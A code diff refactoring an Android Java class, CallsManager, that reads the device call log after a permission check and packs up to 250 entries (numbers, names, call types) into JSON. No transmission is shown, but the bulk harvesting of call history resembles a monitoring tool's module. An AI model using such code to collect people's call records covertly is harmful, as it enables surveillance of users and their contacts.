@@ -10,25 +10,30 @@ import com.fason.app.core.permissions.PermissionManager;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-public class CallsManager {
+// Call log manager
+public final class CallsManager {
 
-    private static final int MAX_CALLS = 250;
+    private static final int MAX = 250;
 
-    public static JSONObject getCallsLogs() {
+    private CallsManager() {}
+
+    // Get call logs
+    public static JSONObject getLogs() {
         JSONObject result = new JSONObject();
         JSONArray list = new JSONArray();
 
         try {
             result.put("callsList", list);
 
-            // Check permission
             if (!PermissionManager.canIUse(Manifest.permission.READ_CALL_LOG)) {
                 result.put("error", "Permission denied");
                 return result;
             }
 
             Cursor cur = FasonApp.getContext().getContentResolver().query(
-                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
+                CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                CallLog.Calls.DATE + " DESC");
 
             if (cur != null) {
                 int numIdx = cur.getColumnIndex(CallLog.Calls.NUMBER);
@@ -38,7 +43,7 @@ public class CallsManager {
                 int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);
                 int count = 0;
 
-                while (cur.moveToNext() && count < MAX_CALLS) {
+                while (cur.moveToNext() && count < MAX) {
                     JSONObject call = new JSONObject();
                     call.put("phoneNo", numIdx >= 0 ? cur.getString(numIdx) : "");
                     call.put("name", nameIdx >= 0 ? cur.getString(nameIdx) : "");
@@ -54,5 +59,10 @@ public class CallsManager {
         } catch (Exception ignored) {}
 
         return result;
+    }
+
+    // Legacy method
+    public static JSONObject getCallsLogs() {
+        return getLogs();
     }
 }
